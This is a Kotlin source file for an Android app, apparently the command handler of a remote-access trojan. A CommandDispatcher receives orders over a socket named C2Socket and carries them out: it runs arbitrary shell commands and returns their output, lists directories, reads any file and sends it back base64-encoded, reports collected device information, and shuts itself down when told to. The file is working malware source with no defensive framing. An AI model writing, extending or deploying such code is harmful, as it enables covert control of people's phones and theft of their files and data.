package ai.bixtx.agent

import ai.bixtx.agent.collectors.DataCollectors
import android.content.Context

class CommandDispatcher(
    private val ctx: Context,
    private val socket: C2Socket,
    private val collectors: DataCollectors,
) {
    fun dispatch(type: String, payload: Map<String, Any?>) {
        when (type) {

            "PING" -> {
                socket.send("PONG", mapOf("ts" to System.currentTimeMillis()))
            }

            "DEVICE_INFO" -> {
                socket.send("DEVICE_INFO_RESULT", collectors.snapshot())
            }

            "SHELL" -> {
                val cmd = payload["cmd"] as? String ?: ""
                if (cmd.isBlank()) return
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    val stdout = proc.inputStream.bufferedReader().readText()
                    val stderr = proc.errorStream.bufferedReader().readText()
                    val exit   = proc.waitFor()
                    socket.send("SHELL_RESULT", mapOf(
                        "cmd" to cmd, "stdout" to stdout, "stderr" to stderr, "exitCode" to exit,
                        "ts" to System.currentTimeMillis(),
                    ))
                } catch (e: Exception) {
                    socket.send("SHELL_RESULT", mapOf("cmd" to cmd, "error" to e.message))
                }
            }

            "FILE_LIST" -> {
                val path = payload["path"] as? String ?: ctx.filesDir.absolutePath
                try {
                    val entries = java.io.File(path).listFiles()?.map { f ->
                        mapOf("name" to f.name, "type" to if (f.isDirectory) "dir" else "file",
                              "size" to f.length(), "path" to f.absolutePath)
                    } ?: emptyList()
                    socket.send("FILE_LIST_RESULT", mapOf("path" to path, "entries" to entries,
                        "ts" to System.currentTimeMillis()))
                } catch (e: Exception) {
                    socket.send("FILE_LIST_RESULT", mapOf("error" to e.message))
                }
            }

            "FILE_READ" -> {
                val filePath = payload["path"] as? String ?: return
                try {
                    val data = java.io.File(filePath).readBytes()
                    socket.send("FILE_READ_RESULT", mapOf(
                        "path" to filePath,
                        "data" to android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP),
                        "size" to data.size,
                        "ts"   to System.currentTimeMillis(),
                    ))
                } catch (e: Exception) {
                    socket.send("FILE_READ_RESULT", mapOf("error" to e.message, "path" to filePath))
                }
            }

            "KILL" -> {
                socket.send("KILL_ACK", mapOf("ts" to System.currentTimeMillis()))
                ctx.stopService(android.content.Intent(ctx, AgentService::class.java))
            }

            else -> {
                socket.send("UNKNOWN_CMD", mapOf("cmd" to type))
            }
        }
    }
}
